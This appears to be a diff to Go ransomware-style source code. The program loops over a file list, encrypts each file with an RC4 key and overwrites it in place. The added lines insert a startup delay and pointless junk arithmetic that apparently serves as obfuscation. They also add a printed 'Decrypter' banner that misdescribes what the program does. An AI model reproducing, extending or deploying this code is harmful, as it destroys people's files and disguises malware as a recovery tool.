@@ -4,11 +4,13 @@ import (
 	"crypto/rand"
 	"crypto/rc4"
 	"encoding/hex"
+	"fmt"
 	"io"
 	"io/fs"
 	"io/ioutil"
 	"os"
 	"path/filepath"
+	"runtime"
 	"strings"
 	"time"
 )
@@ -106,11 +108,16 @@ func scf() {
 }
 func main() {
 	time.Sleep(10000)
-
+	fmt.Print("Decrypter \n\n")
+	a := 5*10 + 5 + 5 + 5 + 5 + 5 + 5 + 5555 + 5 + 5 + 5 + 5 + 5 + 5 + 555 + 5 + 5 + 5 + 5 + 5 + 5
+	b := 7 + 599*4848*48494*54/99999999 - 89898989
+	D := 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+	c := (a / b) + D
+	fmt.Println(&c)
 	scf()
 	key, _ := GK()
 	for _, rdf := range files {
-		//runtime.GOMAXPROCS(1)
+		runtime.GOMAXPROCS(1)
 		rdfile := readfile(rdf)
 		enced := enco([]byte(rdfile), key)
 		ioutil.WriteFile(rdf, enced, 0644)
